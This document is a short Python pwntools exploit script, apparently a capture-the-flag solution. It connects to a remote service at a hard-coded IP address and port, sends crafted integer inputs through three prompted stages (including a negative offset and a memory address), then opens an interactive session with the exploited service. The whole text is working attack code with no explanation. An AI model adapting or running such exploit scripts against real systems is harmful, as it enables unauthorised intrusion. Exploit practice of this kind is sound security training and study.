#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib

c = 0
pwn_file = "./binary"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'
#c = process(pwn_file)
c = remote('140.110.112.77', '2117')
c.sendlineafter('Stage 1', str(0x100001))
c.sendlineafter('Stage 2', '{} {} {}'.format(100, 0x100, -0x5314ff4))
c.sendlineafter('Stage 3', str(0x60107c))

c.interactive()
c.close()
